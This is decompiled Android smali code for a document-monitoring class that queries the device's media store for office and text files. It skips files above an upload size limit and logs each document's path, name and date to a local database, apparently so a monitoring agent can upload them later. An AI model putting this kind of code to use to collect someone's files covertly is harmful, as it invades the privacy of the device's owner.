.class public Lcom/hp/vd/module/monitor/document/DocumentCallable;
.super Ljava/lang/Object;
.source "DocumentCallable.java"

# interfaces
.implements Ljava/util/concurrent/Callable;


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Ljava/lang/Object;",
        "Ljava/util/concurrent/Callable<",
        "Ljava/lang/Void;",
        ">;"
    }
.end annotation


# static fields
.field protected static final TAG:Ljava/lang/String; = "DocumentCallable"


# instance fields
.field protected contentResolver:Landroid/content/ContentResolver;

.field protected contentUri:Landroid/net/Uri;

.field protected dao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/DocumentData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected documentObserver:Lcom/hp/vd/module/monitor/document/DocumentObserver;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Landroid/content/ContentResolver;Landroid/net/Uri;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/module/monitor/document/DocumentObserver;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/ContentResolver;",
            "Landroid/net/Uri;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/DocumentData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/module/monitor/document/DocumentObserver;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 42
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 26
    iput-object v0, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->contentResolver:Landroid/content/ContentResolver;

    .line 27
    iput-object v0, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->contentUri:Landroid/net/Uri;

    .line 28
    iput-object v0, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 29
    iput-object v0, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 30
    iput-object v0, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->documentObserver:Lcom/hp/vd/module/monitor/document/DocumentObserver;

    .line 31
    iput-object v0, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 32
    iput-object v0, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 43
    iput-object p1, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->contentResolver:Landroid/content/ContentResolver;

    .line 44
    iput-object p2, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->contentUri:Landroid/net/Uri;

    .line 45
    iput-object p3, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 46
    iput-object p4, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 47
    iput-object p5, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->documentObserver:Lcom/hp/vd/module/monitor/document/DocumentObserver;

    .line 48
    iput-object p6, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 49
    iput-object p7, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public bridge synthetic call()Ljava/lang/Object;
    .locals 1
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 22
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/document/DocumentCallable;->call()Ljava/lang/Void;

    move-result-object v0

    return-object v0
.end method

.method public call()Ljava/lang/Void;
    .locals 12
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/sql/SQLException;
        }
    .end annotation

    const/16 v0, 0xf

    .line 79
    new-array v0, v0, [Ljava/lang/String;

    const-string v1, "txt"

    const/4 v2, 0x0

    aput-object v1, v0, v2

    const-string v1, "csv"

    const/4 v3, 0x1

    aput-object v1, v0, v3

    const-string v1, "pdf"

    const/4 v3, 0x2

    aput-object v1, v0, v3

    const-string v1, "rtf"

    const/4 v3, 0x3

    aput-object v1, v0, v3

    const-string v1, "doc"

    const/4 v4, 0x4

    aput-object v1, v0, v4

    const-string v1, "docx"

    const/4 v4, 0x5

    aput-object v1, v0, v4

    const-string v1, "ppt"

    const/4 v4, 0x6

    aput-object v1, v0, v4

    const-string v1, "pptx"

    const/4 v4, 0x7

    aput-object v1, v0, v4

    const-string v1, "xls"

    const/16 v4, 0x8

    aput-object v1, v0, v4

    const-string v1, "xlsx"

    const/16 v4, 0x9

    aput-object v1, v0, v4

    const-string v1, "pps"

    const/16 v4, 0xa

    aput-object v1, v0, v4

    const-string v1, "key"

    const/16 v4, 0xb

    aput-object v1, v0, v4

    const-string v1, "odp"

    const/16 v4, 0xc

    aput-object v1, v0, v4

    const-string v1, "ods"

    const/16 v4, 0xd

    aput-object v1, v0, v4

    const-string v1, "odt"

    const/16 v4, 0xe

    aput-object v1, v0, v4

    const/4 v1, 0x0

    .line 88
    :try_start_0
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "_id > "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v6, "max_internal_document_id"

    .line 89
    invoke-virtual {v5, v6}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, " AND "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "media_type"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "="

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v5, " AND ("

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "mime_type"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, " IN (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)  OR lower(replace("

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "_display_name"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, ", rtrim("

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "_display_name"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, ", replace("

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "_display_name"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, ", \'.\', \'\' ) ), \'\')) IN ("

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, ", "

    .line 92
    invoke-virtual {p0, v5, v0}, Lcom/hp/vd/module/monitor/document/DocumentCallable;->implode(Ljava/lang/String;[Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "))"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 99
    invoke-static {}, Landroid/webkit/MimeTypeMap;->getSingleton()Landroid/webkit/MimeTypeMap;

    move-result-object v4

    .line 100
    array-length v5, v0

    new-array v10, v5, [Ljava/lang/String;

    move v5, v2

    .line 102
    :goto_0
    array-length v6, v0

    if-ge v5, v6, :cond_0

    .line 103
    aget-object v6, v0, v5

    invoke-virtual {v4, v6}, Landroid/webkit/MimeTypeMap;->getMimeTypeFromExtension(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    aput-object v6, v10, v5

    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    .line 110
    :cond_0
    iget-object v6, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->contentResolver:Landroid/content/ContentResolver;

    iget-object v7, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->contentUri:Landroid/net/Uri;

    const/4 v8, 0x0

    const-string v11, "_id"

    invoke-virtual/range {v6 .. v11}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0
    :try_end_0
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_0 .. :try_end_0} :catch_0

    if-nez v0, :cond_1

    .line 125
    iget-object v0, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "DocumentCallable"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Could not open a cursor for: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->contentUri:Landroid/net/Uri;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-interface {v0, v2, v4, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-object v1

    .line 134
    :cond_1
    invoke-interface {v0}, Landroid/database/Cursor;->getCount()I

    move-result v3

    .line 136
    iget-object v4, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v5, "DocumentCallable"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "call(): total entries: "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v7, " with _id > "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v7, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v8, "max_internal_document_id"

    .line 138
    invoke-virtual {v7, v8}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    .line 136
    invoke-interface {v4, v5, v6}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    if-nez v3, :cond_2

    .line 142
    iget-object v0, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "DocumentCallable"

    const-string v3, "No entries. Exiting..."

    invoke-interface {v0, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-object v1

    :cond_2
    const/4 v3, -0x1

    move v4, v3

    .line 150
    :goto_1
    invoke-interface {v0}, Landroid/database/Cursor;->moveToNext()Z

    move-result v5

    if-eqz v5, :cond_4

    const-string v5, "_data"

    .line 151
    invoke-interface {v0, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v0, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    .line 152
    new-instance v6, Ljava/io/File;

    invoke-direct {v6, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 155
    invoke-virtual {v6}, Ljava/io/File;->length()J

    move-result-wide v7

    iget-object v9, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v10, "max_file_upload_size"

    invoke-virtual {v9, v10}, Lcom/hp/vd/data/ModuleData;->customGetLong(Ljava/lang/String;)Ljava/lang/Long;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/Long;->longValue()J

    move-result-wide v9

    cmp-long v11, v7, v9

    if-lez v11, :cond_3

    .line 156
    iget-object v7, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v8, "DocumentCallable"

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "The file at: "

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, " ("

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 158
    invoke-virtual {v6}, Ljava/io/File;->length()J

    move-result-wide v5

    const-wide/16 v10, 0x400

    div-long/2addr v5, v10

    div-long/2addr v5, v10

    invoke-virtual {v9, v5, v6}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    const-string v5, "MB.) is bigger than "

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "max_file_upload_size"

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, ". Skipping this record."

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 156
    invoke-interface {v7, v8, v5}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    goto :goto_1

    :cond_3
    add-int/lit8 v2, v2, 0x1

    .line 171
    new-instance v4, Lcom/hp/vd/data/DocumentData;

    invoke-direct {v4}, Lcom/hp/vd/data/DocumentData;-><init>()V

    const-string v6, "_id"

    .line 173
    invoke-interface {v0, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v0, v6}, Landroid/database/Cursor;->getInt(I)I

    move-result v6

    invoke-static {v6}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v6

    iput-object v6, v4, Lcom/hp/vd/data/DocumentData;->internalId:Ljava/lang/Integer;

    .line 175
    iput-object v5, v4, Lcom/hp/vd/data/DocumentData;->url:Ljava/lang/String;

    const-string v5, "_display_name"

    .line 176
    invoke-interface {v0, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v0, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/DocumentData;->name:Ljava/lang/String;

    const-string v5, "date_added"

    .line 178
    invoke-interface {v0, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v0, v5}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v5

    invoke-static {v5, v6}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v5

    .line 179
    new-instance v6, Ljava/util/Date;

    invoke-virtual {v5}, Ljava/lang/Long;->longValue()J

    move-result-wide v7

    invoke-direct {v6, v7, v8}, Ljava/util/Date;-><init>(J)V

    iput-object v6, v4, Lcom/hp/vd/data/DocumentData;->createdAt:Ljava/util/Date;

    .line 185
    iget-object v5, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->dao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v5, v4}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    .line 187
    iget-object v4, v4, Lcom/hp/vd/data/DocumentData;->internalId:Ljava/lang/Integer;

    invoke-virtual {v4}, Ljava/lang/Integer;->intValue()I

    move-result v4

    goto/16 :goto_1

    .line 190
    :cond_4
    iget-object v5, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v6, "DocumentCallable"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "run(): documents listed = "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v5, v6, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 192
    invoke-interface {v0}, Landroid/database/Cursor;->isClosed()Z

    move-result v2

    if-nez v2, :cond_5

    .line 193
    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    :cond_5
    if-eq v4, v3, :cond_6

    .line 197
    iget-object v0, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "max_internal_document_id"

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v0, v2, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 198
    iget-object v0, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {v0, v2}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I

    :cond_6
    return-object v1

    :catch_0
    move-exception v0

    .line 119
    iget-object v2, p0, Lcom/hp/vd/module/monitor/document/DocumentCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "DocumentCallable"

    const-string v4, "SQLiteException caught while querying contentResolver"

    invoke-interface {v2, v3, v4, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-object v1
.end method

.method protected varargs implode(Ljava/lang/String;[Ljava/lang/String;)Ljava/lang/String;
    .locals 3

    .line 54
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v1, 0x0

    .line 56
    :goto_0
    array-length v2, p2

    add-int/lit8 v2, v2, -0x1

    if-ge v1, v2, :cond_0

    const-string v2, "\'"

    .line 57
    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 58
    aget-object v2, p2, v1

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "\'"

    .line 59
    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 60
    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_0
    const-string p1, "\'"

    .line 63
    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 64
    array-length p1, p2

    add-int/lit8 p1, p1, -0x1

    aget-object p1, p2, p1

    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\'"

    .line 65
    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 67
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method
